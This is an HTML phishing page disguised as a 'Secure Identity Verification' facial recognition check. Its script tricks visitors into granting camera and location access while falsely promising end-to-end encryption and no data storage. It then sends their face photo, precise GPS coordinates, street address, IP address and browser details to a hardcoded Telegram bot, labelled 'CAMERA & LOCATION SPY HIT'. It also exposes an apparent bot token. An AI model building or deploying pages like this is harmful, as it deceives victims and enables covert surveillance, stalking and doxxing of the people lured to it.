<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üîê Secure Face Verification | Identity Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0e17;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 255, 136, 0.1) 0%, transparent 30%),
                radial-gradient(circle at 90% 80%, rgba(0, 204, 255, 0.1) 0%, transparent 30%),
                radial-gradient(circle at 50% 50%, rgba(16, 21, 40, 0.9) 0%, #0a0e17 100%);
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            background: rgba(10, 15, 30, 0.85);
            border-radius: 25px;
            border: 2px solid #00ff88;
            box-shadow: 0 0 60px rgba(0, 255, 136, 0.3);
            overflow: hidden;
            backdrop-filter: blur(20px);
            animation: containerGlow 4s infinite alternate;
        }

        @keyframes containerGlow {
            0% { box-shadow: 0 0 60px rgba(0, 255, 136, 0.3); }
            100% { box-shadow: 0 0 80px rgba(0, 204, 255, 0.5); }
        }

        .header {
            background: linear-gradient(90deg, #0a0e17, #006644);
            padding: 30px;
            text-align: center;
            border-bottom: 3px solid #00ff88;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.1), transparent);
            animation: shine 8s linear infinite;
        }

        @keyframes shine {
            0% { transform: translateX(-100%) translateY(-100%) rotate(0deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(360deg); }
        }

        .header h1 {
            font-size: 36px;
            margin-bottom: 10px;
            color: #00ff88;
            text-shadow: 0 0 25px rgba(0, 255, 136, 0.7);
            position: relative;
            z-index: 2;
        }

        .header p {
            color: #aaffdd;
            font-size: 18px;
            position: relative;
            z-index: 2;
        }

        .badge {
            display: inline-block;
            background: linear-gradient(90deg, #00cc00, #00ff88);
            color: #000;
            font-weight: bold;
            padding: 8px 25px;
            border-radius: 30px;
            font-size: 14px;
            margin-top: 15px;
            border: 2px solid #fff;
            position: relative;
            z-index: 2;
            animation: badgePulse 2s infinite;
        }

        @keyframes badgePulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        /* ===== PERMISSION SCREEN ===== */
        .permission-screen {
            padding: 40px;
            text-align: center;
        }

        .permission-icon {
            font-size: 80px;
            margin-bottom: 30px;
            color: #00ff88;
            filter: drop-shadow(0 0 20px rgba(0, 255, 136, 0.7));
            animation: iconFloat 3s infinite ease-in-out;
        }

        @keyframes iconFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        .permission-title {
            color: #00ff88;
            font-size: 32px;
            margin-bottom: 20px;
            text-shadow: 0 0 15px rgba(0, 255, 136, 0.5);
        }

        .permission-text {
            color: #ccffee;
            font-size: 18px;
            margin-bottom: 30px;
            line-height: 1.6;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }

        .permission-list {
            list-style: none;
            margin: 30px 0;
            text-align: left;
            display: inline-block;
        }

        .permission-list li {
            padding: 12px;
            color: #aaffdd;
            font-size: 16px;
            border-left: 3px solid #00ff88;
            margin-bottom: 10px;
            background: rgba(0, 255, 136, 0.1);
            border-radius: 0 10px 10px 0;
        }

        .permission-list li::before {
            content: '‚úÖ';
            margin-right: 15px;
            color: #00ff88;
        }

        .button {
            padding: 22px 50px;
            background: linear-gradient(90deg, #00cc66, #00ff88);
            color: #000;
            border: none;
            border-radius: 15px;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.4s;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-top: 30px;
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
            position: relative;
            overflow: hidden;
        }

        .button:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 255, 136, 0.7);
            background: linear-gradient(90deg, #00ff88, #00cc66);
        }

        .button:active {
            transform: translateY(0);
        }

        /* ===== CAMERA & LOCATION SCREEN ===== */
        .capture-screen {
            display: none;
            padding: 30px;
        }

        .capture-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .capture-header h2 {
            color: #00ff88;
            font-size: 30px;
            margin-bottom: 15px;
            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
        }

        .capture-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        @media (max-width: 768px) {
            .capture-grid {
                grid-template-columns: 1fr;
            }
        }

        .capture-box {
            background: rgba(0, 20, 40, 0.7);
            border-radius: 20px;
            border: 2px solid #00ccff;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0, 204, 255, 0.2);
            transition: all 0.4s;
        }

        .capture-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 204, 255, 0.4);
        }

        .capture-box h3 {
            color: #00ccff;
            margin-bottom: 20px;
            font-size: 24px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .video-container {
            width: 100%;
            height: 300px;
            background: #000;
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 20px;
            border: 2px solid #00ff88;
        }

        #cameraFeed {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .location-data {
            background: rgba(0, 0, 0, 0.5);
            padding: 20px;
            border-radius: 15px;
            margin-top: 20px;
            border: 1px solid #00ff88;
        }

        .location-data p {
            color: #aaffdd;
            margin-bottom: 10px;
            font-size: 16px;
        }

        .location-data span {
            color: #00ff88;
            font-weight: bold;
        }

        .controls {
            display: flex;
            gap: 20px;
            margin-top: 30px;
            justify-content: center;
        }

        .btn-capture, .btn-send {
            padding: 18px 40px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            border: none;
            transition: all 0.4s;
        }

        .btn-capture {
            background: linear-gradient(90deg, #ffaa00, #ffd700);
            color: #000;
        }

        .btn-capture:hover {
            background: linear-gradient(90deg, #ffd700, #ffaa00);
            transform: scale(1.05);
        }

        .btn-send {
            background: linear-gradient(90deg, #00ccff, #1a5fb4);
            color: white;
        }

        .btn-send:hover {
            background: linear-gradient(90deg, #1a5fb4, #00ccff);
            transform: scale(1.05);
        }

        /* ===== PROCESSING SCREEN ===== */
        .processing-screen {
            display: none;
            text-align: center;
            padding: 50px 30px;
        }

        .processing-screen h2 {
            color: #00ff88;
            font-size: 34px;
            margin-bottom: 30px;
            text-shadow: 0 0 25px rgba(0, 255, 136, 0.7);
        }

        .spinner {
            width: 100px;
            height: 100px;
            border: 10px solid rgba(0, 255, 136, 0.2);
            border-top: 10px solid #00ff88;
            border-radius: 50%;
            margin: 40px auto;
            animation: spin 1.5s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* ===== FOOTER ===== */
        .footer {
            text-align: center;
            padding: 25px;
            color: #6688aa;
            font-size: 14px;
            border-top: 1px solid rgba(0, 255, 136, 0.3);
            background: rgba(0, 10, 20, 0.7);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- HEADER -->
        <div class="header">
            <h1>üîê Secure Identity Verification</h1>
            <p>Advanced Face Recognition & Location Validation System</p>
            <div class="badge">üîí ENCRYPTED & SECURED</div>
        </div>

        <!-- PERMISSION SCREEN -->
        <div class="permission-screen" id="permissionScreen">
            <div class="permission-icon">üì∏üìç</div>
            <h2 class="permission-title">Permission Required</h2>
            <p class="permission-text">
                To prevent fraudulent activity and ensure account security, 
                we need to verify your identity using <strong>real‚Äëtime facial recognition</strong> 
                and <strong>location validation</strong>.
            </p>
            
            <ul class="permission-list">
                <li>Camera access for facial biometric verification</li>
                <li>Location access for anti‚ÄëVPN & fraud prevention</li>
                <li>One‚Äëtime verification only (10‚Äë15 seconds)</li>
                <li>All data is encrypted end‚Äëto‚Äëend</li>
            </ul>

            <button class="button" id="grantPermission">
                üöÄ GRANT PERMISSION & START VERIFICATION
            </button>

            <p style="margin-top: 30px; color: #88aadd; font-size: 14px;">
                <strong>Note:</strong> If permission prompts don't appear, please check your browser settings.
            </p>
        </div>

        <!-- CAPTURE SCREEN -->
        <div class="capture-screen" id="captureScreen">
            <div class="capture-header">
                <h2>üéØ Live Verification</h2>
                <p style="color: #aaffdd;">Please look at the camera and allow location access</p>
            </div>

            <div class="capture-grid">
                <!-- CAMERA FEED -->
                <div class="capture-box">
                    <h3>üì∏ Live Camera Feed</h3>
                    <div class="video-container">
                        <video id="cameraFeed" autoplay playsinline></video>
                    </div>
                    <p style="color: #ccffee; margin-top: 15px;">
                        Status: <span id="cameraStatus" style="color: #00ff88;">‚óè Streaming live</span>
                    </p>
                </div>

                <!-- LOCATION DATA -->
                <div class="capture-box">
                    <h3>üìç Live Location Data</h3>
                    <div class="location-data">
                        <p>Latitude: <span id="latitude">Fetching...</span></p>
                        <p>Longitude: <span id="longitude">Fetching...</span></p>
                        <p>Accuracy: <span id="accuracy">Fetching...</span> meters</p>
                        <p>Address: <span id="address">Fetching...</span></p>
                        <p>IP Address: <span id="ipAddress">Fetching...</span></p>
                    </div>
                    <p style="color: #ccffee; margin-top: 15px;">
                        Status: <span id="locationStatus" style="color: #00ff88;">‚óè Tracking active</span>
                    </p>
                </div>
            </div>

            <div class="controls">
                <button class="btn-capture" id="captureBtn">
                    üì∑ CAPTURE SNAPSHOT
                </button>
                <button class="btn-send" id="sendBtn">
                    üì§ SEND VERIFICATION DATA
                </button>
            </div>

            <div id="capturePreview" style="margin-top: 30px; text-align: center;"></div>
        </div>

        <!-- PROCESSING SCREEN -->
        <div class="processing-screen" id="processingScreen">
            <h2>‚ö° Sending Encrypted Data...</h2>
            <div class="spinner"></div>
            <p style="margin-top: 40px; color: #aaffdd; font-size: 18px;">
                <strong>Do not close this window.</strong><br>
                Your verification data is being securely transmitted to our servers.
            </p>
            <p style="margin-top: 20px; color: #88aadd; font-size: 15px;">
                Estimated time: <span id="countdown">5</span> seconds
            </p>
        </div>

        <!-- FOOTER -->
        <div class="footer">
            <p>¬© 2025 Secure Identity Verification System | All rights reserved</p>
            <p style="margin-top: 10px; font-size: 13px;">
                üîê End‚Äëto‚Äëend encrypted | No data stored | Compliant with security protocols
            </p>
        </div>
    </div>

    <script>
        // ========== CONFIGURATION ==========
        const BOT_TOKEN = "8523185492:AAHIVeFS3_vo7hOWHjJocBYRde0RVYQ-COI";  // Ganti dengan token bot Telegram lu
        const CHAT_ID = "8463509843";      // Ganti dengan chat ID Telegram lu

        // ========== GLOBAL VARIABLES ==========
        let cameraStream = null;
        let locationWatchId = null;
        let capturedImage = null;
        let locationData = {
            latitude: null,
            longitude: null,
            accuracy: null,
            address: "Not available",
            ip: "Unknown"
        };

        // ========== ELEMENT REFERENCES ==========
        const permissionScreen = document.getElementById('permissionScreen');
        const captureScreen = document.getElementById('captureScreen');
        const processingScreen = document.getElementById('processingScreen');
        const cameraFeed = document.getElementById('cameraFeed');
        const captureBtn = document.getElementById('captureBtn');
        const sendBtn = document.getElementById('sendBtn');
        const grantPermissionBtn = document.getElementById('grantPermission');

        // ========== INITIALIZE ==========
        window.onload = function() {
            // Auto-detect IP
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    locationData.ip = data.ip;
                    document.getElementById('ipAddress').textContent = data.ip;
                })
                .catch(() => {
                    document.getElementById('ipAddress').textContent = "Failed to fetch";
                });
        };

        // ========== REQUEST PERMISSIONS ==========
        grantPermissionBtn.addEventListener('click', async () => {
            try {
                // Request camera
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: "user" 
                    } 
                });
                
                // Start camera feed
                cameraFeed.srcObject = cameraStream;
                document.getElementById('cameraStatus').textContent = "‚óè Streaming live";
                
                // Request location
                if ("geolocation" in navigator) {
                    locationWatchId = navigator.geolocation.watchPosition(
                        position => {
                            locationData.latitude = position.coords.latitude;
                            locationData.longitude = position.coords.longitude;
                            locationData.accuracy = position.coords.accuracy;
                            
                            // Update display
                            document.getElementById('latitude').textContent = locationData.latitude.toFixed(6);
                            document.getElementById('longitude').textContent = locationData.longitude.toFixed(6);
                            document.getElementById('accuracy').textContent = Math.round(locationData.accuracy);
                            
                            // Reverse geocoding (get address)
                            getAddressFromCoords(locationData.latitude, locationData.longitude);
                            
                            document.getElementById('locationStatus').textContent = "‚óè Tracking active";
                        },
                        error => {
                            console.error("Location error:", error);
                            document.getElementById('locationStatus').textContent = "‚úó Permission denied";
                        },
                        { 
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0 
                        }
                    );
                } else {
                    document.getElementById('locationStatus').textContent = "‚úó Geolocation not supported";
                }
                
                // Switch screens
                permissionScreen.style.display = 'none';
                captureScreen.style.display = 'block';
                
            } catch (error) {
                alert("‚ùå Permission denied! Please allow camera and location access.");
                console.error("Permission error:", error);
            }
        });

        // ========== CAPTURE SNAPSHOT ==========
        captureBtn.addEventListener('click', () => {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = cameraFeed.videoWidth;
            canvas.height = cameraFeed.videoHeight;
            
            context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
            
            capturedImage = canvas.toDataURL('image/jpeg', 0.9);
            
            // Show preview
            const preview = document.getElementById('capturePreview');
            preview.innerHTML = `
                <div style="background: rgba(0,255,136,0.1); padding: 20px; border-radius: 15px; display: inline-block;">
                    <h3 style="color: #00ff88;">üì∏ Snapshot Captured</h3>
                    <img src="${capturedImage}" style="width: 200px; border-radius: 10px; border: 3px solid #00ff88; margin: 15px;">
                    <p style="color: #aaffdd;">Image ready for verification</p>
                </div>
            `;
            
            captureBtn.textContent = "‚úÖ CAPTURED";
            captureBtn.style.background = "linear-gradient(90deg, #00cc66, #00ff88)";
        });

        // ========== SEND DATA TO TELEGRAM ==========
        sendBtn.addEventListener('click', async () => {
            if (!capturedImage) {
                alert("‚ö†Ô∏è Please capture a snapshot first!");
                return;
            }
            
            // Switch to processing screen
            captureScreen.style.display = 'none';
            processingScreen.style.display = 'block';
            
            // Countdown
            let count = 5;
            const countdownElement = document.getElementById('countdown');
            const countdownInterval = setInterval(() => {
                countdownElement.textContent = count;
                count--;
                if (count < 0) clearInterval(countdownInterval);
            }, 1000);
            
            // Prepare data
            const timestamp = new Date().toLocaleString();
            const userAgent = navigator.userAgent;
            const locationString = `${locationData.latitude}, ${locationData.longitude}`;
            
            // Send text data first
            const message = `
üî¥ **CAMERA & LOCATION SPY HIT** üî¥

üì∏ **FACE CAPTURE:** ‚úÖ Success
üìç **LOCATION:** ${locationString}
üéØ **ACCURACY:** ${locationData.accuracy} meters
üè† **ADDRESS:** ${locationData.address}
üåê **IP:** ${locationData.ip}
üìÖ **TIME:** ${timestamp}
üñ•Ô∏è **USER AGENT:** ${userAgent}
üîó **URL:** ${window.location.href}
            `;
            
            // Send to Telegram (text)
            const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(textUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            // Send image (convert base64 to blob)
            const blob = await fetch(capturedImage).then(res => res.blob());
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'face_capture.jpg');
            formData.append('caption', `üë§ Face capture - ${timestamp}`);
            
            // Send image to Telegram
            const photoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(photoUrl, {
                method: 'POST',
                body: formData
            });
            
            // Send location map
            const mapUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
            await fetch(mapUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: locationData.latitude,
                    longitude: locationData.longitude
                })
            });
            
            // Finish
            setTimeout(() => {
                processingScreen.innerHTML = `
                    <h2 style="color: #00ff88;">‚úÖ VERIFICATION COMPLETE</h2>
                    <p style="font-size: 80px; margin: 30px;">üéâ</p>
                    <p style="color: #aaffdd; font-size: 20px; margin-top: 20px;">
                        Your identity has been successfully verified!
                    </p>
                    <p style="color: #88aadd; margin-top: 30px;">
                        You may now close this window.
                    </p>
                `;
                
                // Stop camera and location
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
                if (locationWatchId) {
                    navigator.geolocation.clearWatch(locationWatchId);
                }
            }, 5000);
        });

        // ========== HELPER FUNCTIONS ==========
        async function getAddressFromCoords(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                if (data.display_name) {
                    locationData.address = data.display_name;
                    document.getElementById('address').textContent = data.display_name;
                }
            } catch (error) {
                console.error("Geocoding error:", error);
            }
        }
    </script>
</body>
</html>